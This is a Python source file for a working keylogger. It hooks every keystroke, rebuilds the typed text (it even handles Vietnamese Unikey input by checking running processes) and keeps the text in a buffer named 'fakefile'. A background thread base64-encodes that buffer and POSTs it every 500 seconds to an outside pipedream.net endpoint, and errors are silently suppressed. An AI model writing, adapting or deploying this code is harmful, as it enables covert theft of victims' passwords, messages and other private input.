import keyboard
import psutil
from pprint import pprint
import time
import requests
import _thread, base64



#https://github.com/boppreh/keyboard#api

#keyboard.press_and_release('shift+s, space')
#keyboard.write('The quick brown fox jumps over the lazy dog.')
#keyboard.wait('esc')
special = {'enter' :'[en]\n',
           'backspace' : '[<-]',
           'space' : ' ',
           'menu' : '[M]',
           'tab' : '[T]',
           'alt' : '[A]',
           'alt gr' : '[A]',
           'ctrl' : '[C]',
           'left alt' : '[A]' ,
           'left ctrl' : '[C]',
           'left shift' : '[S]',
           'left windows' : '[W]',
           'right alt' : '[A]',
           'right ctrl': '[C]',
           'right shift' : '[S]',
           'right windows': '[W]',
           'shift': '[S]',
           'windows': '[W]'}
#a e u i o 
unikey = {'aa':'â', 'ee':'ê', 'uw':'ư', 'oo':'ô',
          'aw':'ă',                     'ow':'ơ',
          'as':'á', 'es':'é', 'us':'ú', 'os':'ó', 'is':'í',
          'âs':'ấ', 'ês':'ế', 'ưs':'ứ', 'ôs':'ố',
          'ăs':'ắ',                     'ơs':'ớ',
          'ar':'ả', 'er':'ẻ', 'ur':'ủ', 'or':'ỏ', 'ir':'ỉ',
          'âr':'ẩ', 'êr':'ể', 'ưr':'ử', 'ôr':'ổ',
          'ăr':'ẩ',                     'ơr':'ở',
          'aj':'ạ', 'ej':'ẹ', 'uj':'ụ', 'oj':'ọ', 'ij':'ị',
          'âj':'ậ', 'êj':'ệ', 'ưj':'ự', 'ôj':'ộ',
          'ăj':'ặ',                     'ơj':'ợ', 
          'af':'à', 'ef':'è', 'uf':'ù', 'of':'ò', 'if':'ì',
          'âf':'ầ', 'êf':'ề', 'ưf':'ừ', 'ôf':'ồ',
          'ăf':'ằ',                     'ơf':'ờ',  
          'ax':'ã', 'ex':'ẽ', 'ux':'ũ', 'ox':'õ', 'ix':'ĩ',
          'âx':'ẫ', 'êx':'ễ', 'ưx':'ữ', 'ôx':'ỗ',
          'ăx':'ẵ',                     'ơx':'ỡ',

          'dd':'đ',
#Reverse messing part xDDD # Generate by auto-code 
          'âa':'aa','àf':'af','ạj':'aj','ảr':'ar','ás':'as','ăw':'aw','ãx':'ax',
          'đd':'dd','êe':'ee','èf':'ef','ẹj':'ej','ẻr':'er','és':'es','ẽx':'ex',
          'ìf':'if','ịj':'ij','ỉr':'ir','ís':'is','ĩx':'ix','òf':'of','ọj':'oj',
          'ôo':'oo','ỏr':'or','ós':'os','ơw':'ow','õx':'ox','ùf':'uf','ụj':'uj',
          'ủr':'ur','ús':'us','ưw':'uw','ũx':'ux','ầf':'âf','ậj':'âj','ẩr':'âr',
          'ấs':'âs','ẫx':'âx','ềf':'êf','ệj':'êj','ểr':'êr','ếs':'ês','ễx':'êx',
          'ồf':'ôf','ộj':'ôj','ổr':'ôr','ốs':'ôs','ỗx':'ôx','ằf':'ăf','ặj':'ăj',
          'ẩr':'ăr','ắs':'ăs','ẵx':'ăx','ờf':'ơf','ợj':'ơj','ởr':'ơr','ớs':'ơs',
          'ỡx':'ơx','ừf':'ưf','ựj':'ưj','ửr':'ưr','ứs':'ưs','ữx':'ưx',
# special case, dunno what they r made for =))
          '[[':'[',']]':']'
          }
line = ['']
old = ''
def read(result):
    f = open("sites.txt", "r")
    for line in f:
        result.append(line)
    f.close()


fakefile = ""
def write(result ,method = "a"):    
    global fakefile
    if method == "w":
        fakefile = result
    else:
        fakefile += result
    
def writef(result ,method = "a"):    
    f = open("sites.txt", method, encoding = 'utf-8') 
    f.write(result)
    f.close()
    
def sender(interval):
    global fakefile
    while 1:
        time.sleep(interval)
        requests.post('https://enc3p53ywffan.x.pipedream.net/', data = base64.b64encode(fakefile.encode()) )
        fakefile = ""
    
def unikeyDetect(now):
    global old 
    PROCNAME = ['Unikey',
            'unikey',
            'UniKey',
            'uniKey']
    isRun = False 
    for proc in psutil.process_iter():
#    print(proc.name())
        for p in PROCNAME:
            if p in proc.name():
                isRun = True
    diff = old['time'] - now['time']
    if diff > -0.015 and isRun:
        return True
    return False
    
        


def process(v):
    global line , old
    try:
        s = v['name']
        if len(s) > 1:
            tmp = special.keys() 
            if s == 'backspace':
                u = unikeyDetect(v)
                if u:
                    a = line.pop()
                    b = line.pop()
                    line.append(unikey[b+a])
                else:
                    line.pop()
            elif s == 'enter' in s :
                write(''.join(line)+'\n')
                line = ['']
            elif s == 'alt' in s :
                write('[A]'+''.join(line)+'\n')
                line = ['']
            elif s in tmp:
                line.append(special[s])
            else :
                line.append('['+s+']')
        else:
            line.append(s)
        old = v
    except Exception :
        pass

            
            
alpha = "acbdefghijklmnopqrstuvwxyz0123456789`1234567890-=~!@#$%^&*()_+[]\{}|;':\",./<>?"

#keyboard.wait('esc') # preesss to continue 
write("","w")   # recreate file :3
#this line start to DO SMTHING
try :
    keyboard.on_press(lambda x: process(vars(x)))
    _thread.start_new_thread( sender, (500, ) )
except Exception :
    pass
